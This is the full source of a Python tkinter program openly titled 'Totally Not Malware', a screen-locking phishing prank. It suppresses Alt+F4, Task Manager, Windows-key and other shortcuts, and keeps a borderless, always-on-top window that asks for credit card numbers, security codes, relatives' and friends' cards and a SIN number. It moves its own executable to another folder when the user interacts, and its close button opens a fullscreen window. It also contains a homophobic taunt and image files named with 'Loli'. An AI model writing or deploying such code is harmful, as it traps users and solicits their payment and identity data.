import tkinter as tk 
import keyboard
import os, sys
def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)
def resource_path1(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)
changed = False
def changelocation():
    global changed
    if changed == False:
        #Drives = [ chr(x) + ":" for x in range(65,90) if os.path.exists(chr(x) + ":") ]
        CurrentLocation = os.path.abspath(__file__)
        CurrentLocation = CurrentLocation.replace(".py",".exe")
        Distination = os.path.expanduser('~') + "\\" + os.path.basename(__file__)
        Distination = Distination.replace(".py",".exe")
        if CurrentLocation[0] == Distination[0]:
            os.rename(CurrentLocation, Distination)
        else:
            driveToSearch = CurrentLocation[0] + ":\\"
            search = os.listdir(driveToSearch)
            print(CurrentLocation, Distination, driveToSearch, search)
            directories = []
            for filemaybe in search:
                if os.path.isdir(filemaybe):
                    directories.append(filemaybe)
                    print(filemaybe)
            if len(directories) > 0:
                print(driveToSearch, '\\',directories[0],'\\', os.path.basename(__file__))
                Distination = driveToSearch + "\\" + directories[0] + "\\" + os.path.basename(__file__)
            else:
                Distination = driveToSearch + "\\" + os.path.basename(__file__)
            Distination = Distination.replace(".py",".exe")
            CurrentLocation = os.path.abspath(__file__)
            CurrentLocation = CurrentLocation.replace(".py",".exe")
            os.rename(CurrentLocation, Distination)
        changed = True

root = tk.Tk()
root.title("Totally Not Malware")
widht, height = root.winfo_screenwidth() // 2 - 290 , root.winfo_screenheight() // 2 - 134
root.geometry('580x239+{}+{}'.format(widht, height))
root.overrideredirect(1) # like full screen but the size of the window 
keyboard.add_hotkey('alt', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('ctrl', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('shift', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('`', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('tab', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('delete', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('f11', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('f12', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('f2', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('home', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('insert', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('end', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('alt+f4', print,args=("NoMore Alt", "f4"), suppress=True)
keyboard.add_hotkey('alt+tab', print,args=("NoMore Alt", "tab"), suppress=True)
keyboard.add_hotkey('ctrl+w', print,args=("NoMore ctrl", "w"), suppress=True)
keyboard.add_hotkey('win', print,args=("NoMore windows", "key?"), suppress=True)
keyboard.add_hotkey('ctrl+shift+esc',print,args=("ur", "gay"), suppress=True)
keyboard.add_hotkey('capslock', print, args=("NoMore windows", "key?"), suppress=True)
keyboard.add_hotkey('ctrl+f4', print, args=("NoMore windows", "key?"), suppress=True)
keyboard.add_hotkey('win+d', print, args=("NoMore windows", "key?"), suppress=True)
keyboard.add_hotkey('ctrl+esc', print, args=("NoMore windows", "key?"), suppress=True)
keyboard.add_hotkey('win+m', print, args=("NoMore windows", "key?"), suppress=True)
keyboard.add_hotkey('win+tab', print, args=("NoMore windows", "key?"), suppress=True)

global store, store1, store2, numberOfCardsAskedFor
Title = "H-hi there... \n Do you th-think I could have your \n credit card information, p-please?"
Card = "Card Number:"
Expiry = "   Expiry Date:"
Security = "Security Code:"
ButtonText = "Th-thanks"
store = ''
store1 = ''
store2 = ''
numberOfCardsAskedFor = 0
#---------------------------------------
def OnPress():
    global numberOfCardsAskedFor
    changelocation()
    cardget = CardNumberInput.get()
    expirydateget = ExpiryDateInput.get()
    securitycodeget = SecurityCodeInput.get()
    CardNumberInput.delete(0,tk.END)
    ExpiryDateInput.delete(0,tk.END)
    SecurityCodeInput.delete(0,tk.END)
    CardNumberInput.insert(tk.INSERT,"0000-0000-0000-0000")
    ExpiryDateInput.insert(tk.INSERT,"Month/Day/Year")
    SecurityCodeInput.insert(tk.INSERT,"123")
    
    if securitycodeget == "exit-program" or securitycodeget == "close-program" or securitycodeget == "kill-program" or securitycodeget == "end-program" or expirydateget == "close-program":
        root.destroy()
    if len(securitycodeget) == 9 or cardget != "0000-0000-0000-0000" and expirydateget != "Month/Day/Year" and securitycodeget != "123":
        numberOfCardsAskedFor += 1
        if numberOfCardsAskedFor == 1:
            TitleLabel.config(text = "T-thank you!... C-could I a..also \n have your parent's card?")
        if numberOfCardsAskedFor == 2:
            TitleLabel.config(text = "T-thank you! A-again... C-could \n I a..also have your sibling's card?")
        if numberOfCardsAskedFor == 3:
            TitleLabel.config(text = "T-thank you! Really!... C-could \n I a..also have your friend's card?")
        if numberOfCardsAskedFor == 4:
            TitleLabel.config(text = "T-thank you!!!! C-could \n I a..also have your Sin number? \n Type it in the last text box!")
        if numberOfCardsAskedFor == 5:
            TitleLabel.config( font =("bold", 13, ), text = "Thank you so much!!! I will just go \n ahead and check if all of this is valid info UwU \n while I do that feel free to give me more cards!")
            TitleLabel.place(x = 220, y = 39)
    print(cardget, expirydateget, securitycodeget)

def clearCardNumberInput(*args):
    global store
    store = CardNumberInput.get()
    if CardNumberInput.get() == "0000-0000-0000-0000":
        CardNumberInput.delete(0,tk.END)
        changelocation()
def clearExpiryDateInput(*args):
    global store1
    store1 = ExpiryDateInput.get()
    if ExpiryDateInput.get() == "Month/Day/Year":
        ExpiryDateInput.delete(0,tk.END)
        changelocation()
def clearSecurityCodeInput(*args):
    global store2
    store2 = SecurityCodeInput.get()
    if SecurityCodeInput.get() == "123":
        SecurityCodeInput.delete(0,tk.END)
        changelocation()
def fillCardNumberInput(*args):
    global store
    store = CardNumberInput.get()
    store = store.replace(' ', '-')
    CardNumberInput.delete(0,tk.END)
    CardNumberInput.insert(tk.INSERT, store)
    if store == "0000-0000-0000-0000" or (len(store) != 16 and len(store) != 19):
        CardNumberInput.delete(0,tk.END)
        CardNumberInput.insert(tk.INSERT,"0000-0000-0000-0000")
    else:
        store = store.split("-")
        store = ''.join(store)
        for digit in store:
            if not digit.isdigit():
                CardNumberInput.delete(0,tk.END)
                CardNumberInput.insert(tk.INSERT,"0000-0000-0000-0000")

def fillExpiryDateInput(*args):
    global store1
    CANCEL = False
    store1 = ExpiryDateInput.get()
    store1 = store1.replace(' ', '/')
    ExpiryDateInput.delete(0,tk.END)
    ExpiryDateInput.insert(tk.INSERT, store1)
    if store1 == "Month/Day/Year":
        ExpiryDateInput.delete(0,tk.END)
        ExpiryDateInput.insert(tk.INSERT,"Month/Day/Year")
    else:
        store1 = store1.split("/")
        digitstore = ''.join(store1)
        for digit in digitstore:
            if not digit.isdigit():
                ExpiryDateInput.delete(0,tk.END)
                ExpiryDateInput.insert(tk.INSERT,"Month/Day/Year")
                CANCEL = True
                break
        if  CANCEL != True: 
            if len(store1) != 3:
                ExpiryDateInput.delete(0,tk.END)
                ExpiryDateInput.insert(tk.INSERT,"Month/Day/Year")
            elif len(store1[0]) not in [1,2] or len(store1[1]) not in [1,2] or len(store1[2]) != 4:
                ExpiryDateInput.delete(0,tk.END)
                ExpiryDateInput.insert(tk.INSERT,"Month/Day/Year")
def fillSecurityCodeInput(*args):
    global store2
    CANCEL = False
    store2 = SecurityCodeInput.get()
    for digit in store2:
        if not digit.isdigit():
            CANCEL = True
            break
    if CANCEL == True or ' ' in store2 or len(store2) != 3:
        SecurityCodeInput.delete(0,tk.END)
        SecurityCodeInput.insert(tk.INSERT,"123")

#Background Frame
Background = tk.Frame(width = 580, height = 268) #Background = tk.Frame(width = 550, height = 210)268
Background.grid(column = 0, row = 0)
Background.propagate(0)
#Title Bar
def hover(*args):
    exit_button['bg'] = '#E81123'
    exit_button['fg'] = 'white'
    changelocation()
def unhover(*args):
    exit_button['bg'] = 'white'
    exit_button['fg'] = 'black'
def hover1(*args):
    minimize['bg'] = '#e5e5e5'
    changelocation()
def unhover1(*args):
    minimize['bg'] = 'white'   
def minimize(*args):
    root.withdraw()                      
def newwindow1():
    newWindow = tk.Toplevel(root)
    rot = newWindow
    changelocation()

    def clearCardNumberInput1(*args):
        global store
        store = CardNumberInput1.get()
        if CardNumberInput1.get() == "0000-0000-0000-0000":
            CardNumberInput1.delete(0,tk.END)
    def clearExpiryDateInput1(*args):
        global store1
        store1 = ExpiryDateInput1.get()
        if ExpiryDateInput1.get() == "Month/Day/Year":
            ExpiryDateInput1.delete(0,tk.END)
    def clearSecurityCodeInput1(*args):
        global store2
        store2 = SecurityCodeInput1.get()
        if SecurityCodeInput1.get() == "123":
            SecurityCodeInput1.delete(0,tk.END)
    def fillCardNumberInput1(*args):
        global store
        store = CardNumberInput1.get()
        store = store.replace(' ', '-')
        CardNumberInput1.delete(0,tk.END)
        CardNumberInput1.insert(tk.INSERT, store)
        if store == "0000-0000-0000-0000" or (len(store) != 16 and len(store) != 19):
            CardNumberInput1.delete(0,tk.END)
            CardNumberInput1.insert(tk.INSERT,"0000-0000-0000-0000")
        else:
            store = store.split("-")
            store = ''.join(store)
            for digit in store:
                if not digit.isdigit():
                    CardNumberInput1.delete(0,tk.END)
                    CardNumberInput1.insert(tk.INSERT,"0000-0000-0000-0000")

    def fillExpiryDateInput1(*args):
        global store1
        CANCEL = False
        store1 = ExpiryDateInput1.get()
        store1 = store1.replace(' ', '/')
        ExpiryDateInput1.delete(0,tk.END)
        ExpiryDateInput1.insert(tk.INSERT, store1)
        if store1 == "Month/Day/Year":
            ExpiryDateInput1.delete(0,tk.END)
            ExpiryDateInput1.insert(tk.INSERT,"Month/Day/Year")
        else:
            store1 = store1.split("/")
            digitstore = ''.join(store1)
            for digit in digitstore:
                if not digit.isdigit():
                    ExpiryDateInput1.delete(0,tk.END)
                    ExpiryDateInput1.insert(tk.INSERT,"Month/Day/Year")
                    CANCEL = True
                    break
            if  CANCEL != True: 
                if len(store1) != 3:
                    ExpiryDateInput1.delete(0,tk.END)
                    ExpiryDateInput1.insert(tk.INSERT,"Month/Day/Year")
                elif len(store1[0]) not in [1,2] or len(store1[1]) not in [1,2] or len(store1[2]) != 4:
                    ExpiryDateInput1.delete(0,tk.END)
                    ExpiryDateInput1.insert(tk.INSERT,"Month/Day/Year")
    def fillSecurityCodeInput1(*args):
        global store2
        CANCEL = False
        store2 = SecurityCodeInput1.get()
        for digit in store2:
            if not digit.isdigit():
                CANCEL = True
                break
        if CANCEL == True or ' ' in store2 or len(store2) != 3:
            SecurityCodeInput1.delete(0,tk.END)
            SecurityCodeInput1.insert(tk.INSERT,"123")

    def OnPress():
        card = CardNumberInput1.get()
        expiry = ExpiryDateInput1.get()
        security = SecurityCodeInput1.get()
        if security == 'exit-program' or security == 'close-program' or security == 'kill-program' or security == 'stop-program' or security == 'end-program':
            rot.destroy()
        if card != "0000-0000-0000-0000" and expiry != "Month/Day/Year" and security != "123":
            TitleLabel.config(text = "T-thank you!, \n The program will close within 5 minutes if this info is valid!")
            TitleLabel.place(x = 20, y = 29)
    bg = tk.Frame(rot, width = root.winfo_screenwidth(), height = root.winfo_screenheight())
    bg.grid(row = 0, column = 0)
    bg.propagate(0)
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()
    Label = tk.Entry(bg)
    Label.place(x = 0, y = 0, width = root.winfo_screenwidth(), height = root.winfo_screenheight())
    
    image1 = tk.PhotoImage(file=resource_path1("LoliForDotEXEAngry.gif"))
    image1 = image1.zoom(4) 
    image1 = image1.subsample(1)
    img = tk.Label(bg, image=image1)
    img.image = image1
    img.place(x = root.winfo_screenwidth() // 4, y = 0)

    newwindowframe = tk.Frame(bg, width = 550, height = 280)
    newwindowframe.grid(row = 0, column = 0)
    newwindowframe.place(x = width // 2 - 275, y = height - 280)

    TitleLabel = tk.Label(newwindowframe, text = "P-please! I r-really need it...", font=("bold", 15, ))
    CardNumberLabel = tk.Label(newwindowframe, text = "Card Number:", font=("bold", 15, ))
    ExpiryDateLabel = tk.Label(newwindowframe, text = "   Expiry Date:", font=("bold", 15, ))
    SecurityCodeLabel = tk.Label(newwindowframe, text = "Security Code:", font=("bold", 15, ))
    TitleLabel.place(x = 150, y = 29)
    CardNumberLabel.place(x = 119, y = 114)
    ExpiryDateLabel.place(x = 116, y = 144)
    SecurityCodeLabel.place(x = 112, y = 174)

    CardNumberInput1 = tk.Entry(newwindowframe, width = 31, borderwidth = 2,  relief="ridge")
    ExpiryDateInput1 = tk.Entry(newwindowframe, width = 31, borderwidth = 2,  relief="ridge")
    SecurityCodeInput1 = tk.Entry(newwindowframe, width = 31, borderwidth = 2,  relief="ridge")
    ExpiryDateInput1.insert(tk.INSERT,"Month/Day/Year")
    CardNumberInput1.insert(tk.INSERT,"0000-0000-0000-0000")
    SecurityCodeInput1.insert(tk.INSERT,"123")
    CardNumberInput1.bind("<FocusIn>", func=clearCardNumberInput1)
    CardNumberInput1.bind("<FocusOut>", func=fillCardNumberInput1)
    ExpiryDateInput1.bind("<FocusIn>", func=clearExpiryDateInput1)
    ExpiryDateInput1.bind("<FocusOut>", func=fillExpiryDateInput1) 
    SecurityCodeInput1.bind("<FocusIn>", func=clearSecurityCodeInput1)
    SecurityCodeInput1.bind("<FocusOut>", func=fillSecurityCodeInput1)

    CardNumberInput1.place(x = 260, y = 119)
    ExpiryDateInput1.place(x = 260, y = 149)
    SecurityCodeInput1.place(x = 260, y = 179)

    InputButton = tk.Button(newwindowframe, text = "InsertUWU", font=("bold", 15, ), command = OnPress)
    InputButton.place(x = 209, y = 209, height = 25)

    rot.overrideredirect(1)
    rot.attributes('-topmost', True) # make always on top
    rot.resizable(False, False) # make not resizable

title_bar = tk.Frame(Background, width = 580, height = 29, bg = 'white')
title_bar.place(x = 0, y = 0)
title_bar_Label = tk.Label(title_bar, text = 'Totally Not Malware', bg = 'white')
title_bar_Label.place(x = 0, y = 0)

exit_button = tk.Button(title_bar, text = '×', bg = 'white', font=("Times", 20, ),  relief="flat", command = newwindow1)
exit_button.place(x = 536, y = 0, width = 44, height = 30)
exit_button.bind("<Enter>", hover)
exit_button.bind("<Leave>", unhover)

fullscreen = tk.Label(title_bar, text = '☐', fg = '#e5e5e5',bg = 'white', font=( '#EBEBEB', 12,),  relief="flat", borderwidth = 0)
fullscreen.place(x = 492, y = 0, width = 44, height = 29)

minimize = tk.Button(title_bar, text = '─', bg = 'white', font=("Times", 13, ),  relief="flat", command = newwindow1) #newwindow1
minimize.place(x = 448, y = 0, width = 44, height = 29)
minimize.bind("<Enter>", hover1)
minimize.bind("<Leave>", unhover1)
#move on drag
lastClickX = 0
lastClickY = 0
def SaveLastClickPos(event):
    global lastClickX, lastClickY
    lastClickX = event.x
    lastClickY = event.y

def Dragging(event):
    global lastClickX, lastClickY
    x, y = event.x - lastClickX + root.winfo_x(), event.y - lastClickY + root.winfo_y()
    root.geometry("+%s+%s" % (x , y))
title_bar.bind("<B1-Motion>", Dragging)
title_bar.bind("<Button-1>", SaveLastClickPos)
title_bar_Label.bind("<B1-Motion>", Dragging)
title_bar_Label.bind("<Button-1>", SaveLastClickPos)
#Input
CardNumberInput = tk.Entry(Background, width = 31, borderwidth = 2,  relief="ridge")
ExpiryDateInput = tk.Entry(Background, width = 31, borderwidth = 2,  relief="ridge")
SecurityCodeInput = tk.Entry(Background, width = 31, borderwidth = 2,  relief="ridge")
CardNumberInput.insert(tk.INSERT,"0000-0000-0000-0000")
ExpiryDateInput.insert(tk.INSERT,"Month/Day/Year")
SecurityCodeInput.insert(tk.INSERT,"123")

CardNumberInput.bind("<FocusIn>", func=clearCardNumberInput)
CardNumberInput.bind("<FocusOut>", func=fillCardNumberInput)

ExpiryDateInput.bind("<FocusIn>", func=clearExpiryDateInput)
ExpiryDateInput.bind("<FocusOut>", func=fillExpiryDateInput) 

SecurityCodeInput.bind("<FocusIn>", func=clearSecurityCodeInput)
SecurityCodeInput.bind("<FocusOut>", func=fillSecurityCodeInput)

#Labels For Input
TitleLabel = tk.Label(Background, text = Title, font=("bold", 15, ))
CardNumberLabel = tk.Label(Background, text = Card, font=("bold", 15, ))
ExpiryDateLabel = tk.Label(Background, text = Expiry, font=("bold", 15, ))
SecurityCodeLabel = tk.Label(Background, text = Security, font=("bold", 15, ))
#Button
InputButton = tk.Button(Background, text = ButtonText, font=("bold", 15, ), command = OnPress)
#Image 
imagelabel = tk.PhotoImage(file=resource_path("LoliForDotEXE.gif") )
imagelabel = imagelabel.zoom(15) #with 250, I ended up running out of memory
imagelabel = imagelabel.subsample(20)
imagelabel.image = imagelabel
tk.Label(root, image=imagelabel).place(x = -5, y = 29)

#Placing The Input On Frame
CardNumberInput.place(x = 360, y = 119)
ExpiryDateInput.place(x = 360, y = 149)
SecurityCodeInput.place(x = 360, y = 179)
#Placing The Labels On Frame
TitleLabel.place(x = 250, y = 29)
CardNumberLabel.place(x = 219, y = 114)
ExpiryDateLabel.place(x = 216, y = 144)
SecurityCodeLabel.place(x = 212, y = 174)
#Placing The Button On Frame
InputButton.place(x = 309, y = 209, height = 25)

root.attributes('-topmost', True) # make always on top
root.resizable(False, False) # make not resizable

root.mainloop()